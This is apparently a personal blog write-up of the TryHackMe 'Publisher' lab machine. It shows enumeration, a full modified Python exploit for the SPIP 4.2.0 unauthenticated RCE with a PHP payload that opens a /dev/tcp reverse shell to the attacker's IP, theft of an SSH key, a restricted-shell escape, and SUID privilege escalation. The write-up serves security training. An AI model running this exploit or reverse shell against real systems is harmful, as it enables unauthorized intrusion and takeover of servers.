---
layout: single
title: THM - Publisher
date: 2025-10-31
classes: wide
header:
  teaser: /assets/images/thm-publisher/logo.png
  teaser_home_page: true
categories:
  - TryHackMe
  - Easy
  - Linux
tags:
  - spip-4.2.0-rce
  - csrf-token-discovery
  - docker-escape
  - rshell-escape
  - suid-abuse
---

# Introduction
-------------

This writeup documents the penetration testing of the [**Publisher**](https://tryhackme.com/room/publisher) machine from the [**TryHackMe**](https://tryhackme.com/) platform. In this ocasion I'll firstly enumerate and then exploit a RCE in a vulnerable SPIP version to get a reverse shell, scape a Docker container, scape an rshell and finally abuse of an SUID binary.

<br>
# Information Gathering
------------------

After identifying the target's IP address, we need to enumerate as  much information as possible about the host. A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. The [**whichSystem**](https://github.com/Akronox/WichSystem.py) script can also be used for this purpose.
* TTL 64: Linux.
* TTL 128: Windows.

```
❯ ping -c 1 10.10.133.33
PING 10.10.133.33 (10.10.133.33) 56(84) bytes of data.
64 bytes from 10.10.133.33: icmp_seq=1 ttl=63 time=54.4 ms

--- 10.10.133.33 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 54.388/54.388/54.388/0.000 m
```

In this case, it seems to be a Linux machine. Let's perform a port scan with nmap.

```
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.133.33 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 16:45 CET
Initiating SYN Stealth Scan at 16:45
Scanning 10.10.133.33 [65535 ports]
Discovered open port 22/tcp on 10.10.133.33
Discovered open port 80/tcp on 10.10.133.33
Completed SYN Stealth Scan at 16:45, 16.32s elapsed (65535 total ports)
Nmap scan report for 10.10.133.33
Host is up, received user-set (0.056s latency).
Scanned at 2025-10-31 16:45:03 CET for 17s
Not shown: 64016 closed tcp ports (reset), 1517 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.39 seconds
           Raw packets sent: 81300 (3.577MB) | Rcvd: 69984 (2.799MB)
```

```
❯ nmap -sCV -p22,80 10.10.133.33 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 16:46 CET
Nmap scan report for 10.10.133.33
Host is up (0.055s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 29:71:0c:db:f5:2e:2a:0d:30:45:69:cb:31:a2:c7:37 (RSA)
|   256 9a:31:e1:ea:56:42:8d:93:c5:7c:96:0b:63:95:f0:23 (ECDSA)
|_  256 bd:b5:45:c5:5e:16:0a:ae:b7:18:08:fc:5e:54:9e:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Publisher's Pulse: SPIP Insights & Tips
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.35 seconds
```

nmap found some open ports. The intrussion is probably going to be, or at least start, from port 80. You can Google the Apache or SSH version followed by “launchpad” to get a good hint about the OS. You can also check the blog’s [Enumeration Cheat Sheet](https://pwnerguy.github.io/enumeration-cheatsheet/), which includes a table mapping service versions to possible operating system versions. We are facing an **Ubuntu Focal**.

We can't do much with the SSH service since we don't have credentials yet. Now it's time to enumerate the web server running on the port 80:

```
❯ whatweb http://10.10.133.33
http://10.10.133.33 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.133.33], Title[Publisher's Pulse: SPIP Insights & Tips]
```

![](/assets/images/thm-publisher/web.png)

We have nothing interesting on either the website or the source code. Both [**Wappalyzer**](https://www.wappalyzer.com/) and nmap confirm the Apache version which is **2.4.41**.

```
❯ gobuster dir -u 10.10.133.33 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.133.33
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 309] [--> http://10.10.133.33/images/]
/spip                 (Status: 301) [Size: 307] [--> http://10.10.133.33/spip/]
/server-status        (Status: 403) [Size: 275]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```

**Gobuster** found the ``img/``  and ``spip/``. Inside ``spip/`` you can find some links to differents parts of the website. 

**SPIP is a CMS** as we can see in **Wappalyzer**, and it's using **PHP**. Actually, SPIP is a free, open-source content management system (CMS) for creating and managing websites, with a particular focus on collaborative editing and multilingual support. It is written in **PHP**, runs on a database, and is designed to be easy to use for authors, separating editorial, technical, and design tasks

![](/assets/images/thm-publisher/web2.png)

<br>
# Vulnerability Assessment
-----------

Let's search an exploit with **searchsploit** for the 4.2.0 version of SPIP.

```
❯ searchsploit SPIP 4.2.0
------------------------------------------------------------------------------------------------
 Exploit Title                                                            |  Path
------------------------------------------------------------------------------------------------
SPIP v4.2.0 - Remote Code Execution (Unauthenticated)                     | php/webapps/51536.py
------------------------------------------------------------------------------------------------
Shellcodes: No Results
```

The intrusion might be from the login panel, the search bar, or any other location of the ``spip/`` directory, but I'll try to execute this exploit and see if I can get a RCE.

The operation is simple, but in order to execute code in the server, I needed to **edit the Python script**. The original payload failed due to improperly nested quotes and lack of quote escaping which **broke the PHP syntax**.

The edited payload use double quotes to wrap the PHP string and single quotes inside the Bash command, ensuring proper nesting and escaping. This allowed the reverse shell to execute successfully.

```python
#!/usr/bin/env python3

import argparse
import bs4
import requests

def parseArgs():
    parser = argparse.ArgumentParser(description="PoC CVE-2023-27372 - SPIP < 4.2.1 RCE (Unauthenticated)")
    parser.add_argument("-u", "--url", required=True, help="SPIP base URL (e.g., http://target/spip)")
    parser.add_argument("-c", "--command", required=True, help="Command to execute (reverse shell or blind RCE)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose mode")
    return parser.parse_args()

def get_anticsrf(url):
    try:
        r = requests.get(f"{url}/spip.php?page=spip_pass", timeout=10)
        soup = bs4.BeautifulSoup(r.text, 'html.parser')
        csrf_input = soup.find('input', {'name': 'formulaire_action_args'})
        if csrf_input:
            csrf_value = csrf_input['value']
            if options.verbose:
                print(f"[+] Anti-CSRF token found: {csrf_value}")
            return csrf_value
        else:
            print("[-] Unable to find Anti-CSRF token")
            return None
    except Exception as e:
        print(f"[-] Error retrieving CSRF token: {e}")
        return None

def send_payload(url, csrf, payload):
    data = {
        "page": "spip_pass",
        "formulaire_action": "oubli",
        "formulaire_action_args": csrf,
        "oubli": payload
    }
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Referer": f"{url}/spip.php?page=spip_pass"
    }
    try:
        r = requests.post(f"{url}/spip.php?page=spip_pass", data=data, headers=headers)
        if options.verbose:
            print(f"[+] Sent payload: {payload}")
            print(f"[+] HTTP status: {r.status_code}")
        return r.status_code
    except Exception as e:
        print(f"[-] Error sending payload: {e}")
        return None

if __name__ == '__main__':
    options = parseArgs()
    requests.packages.urllib3.disable_warnings()

    csrf = get_anticsrf(options.url)
    if not csrf:
        exit(1)

    php_payload = f'<?php system("bash -c \'exec bash -i &>/dev/tcp/10.8.78.182/4646 <&1\'"); ?>'
    serialized = f's:{len(php_payload)}:"{php_payload}";'

    if options.verbose:
        print(f"[+] Final serialized payload: {serialized}")

    send_payload(options.url, csrf, serialized)
```

<br>
# Exploitation
-----

Now, let's try to get a reverse shell and get access to the machine.

![](/assets/images/thm-publisher/reverse_shell.png)

<br>
# Post-Exploitation
----------

TTY upgrading:

```
❯ script /dev/null -c bash
❯ Ctrl+Z
❯ stty raw -echo; fg
❯ reset xterm
❯ export TERM=xterm
❯ export SHELL=bash
❯ stty rows 44 columns 185
```

Now, if you look at the IP of the machine, you'll see that we are in a **Docker container** inside the Publisher machine. We need to get out of it.

We found the **user flag**!

![](/assets/images/thm-publisher/flag.png)

In the ``.ssh/`` directory of the user **think** you'll find a file ``id_rsa`` that is think's private key. 

If you try to connect to ``think@10.10.133.33`` via SSH using that private key with the command ``ssh -i id_rsa think@10.10.133.33`` , you'll gain access to the real machine. I noticed that when I tried it, since I saw the string ``think@publisher`` in the ``authorized_keys`` file. That made me think that this user may be **is in the real machine too**.

In think's home directory you'll find the same flag we found before.

**Linpeas** show us an interesting SUID file.

```
think@ip-10-10-133-33:/etc/apparmor.d$ ls -l /usr/sbin/run_container
-rwsr-sr-x 1 root root 16760 Nov 14  2023 /usr/sbin/run_container
```

Using the command ``strings`` we can see that it executes a bash scrip: ``/opt/run_container.sh``.

```
think@ip-10-10-133-33:/etc/apparmor.d$ ls -l /opt/run_container.sh
-rwxrwxrwx 1 root root 1715 Jan 10  2024 /opt/run_container.sh
```

We need to modify the file and add ``bash -p`` to get a shell as root, but notice that we are in an Ash Shell and we can't write anything.

>[ash (Kenneth Almquist's ash shell)](https://www.geeksforgeeks.org/linux-unix/difference-between-ash-and-bash/) **is a lightweight (92K) Bourne compatible shell**. Great for machines with low memory, but does not provide all the extras of shells like bash, tcsh, and zsh.

I need to get a bash shell in order to bypass those restrictions. I have used a kernel library to spawn a bash shell:

```
/usr/lib64/ld-linux-x86-64.so.2 /bin/bash
```

The **dynamic loader** ``/usr/lib64/ld-linux-x86-64.so.2 /bin/bash`` (the name may vary depending on the distro) loads the required shared libraries and start the **/bin/bash** shell. This method is also a way to directly execute a binary by explicitly specifying the dynamic loader to use for that particular binary.

Then, I added ``bash -p`` to the ``/opt/run_container.sh`` script and ran the **SUID** binary ``/usr/sbin/run_container``.

![](/assets/images/thm-publisher/root_flag.png)










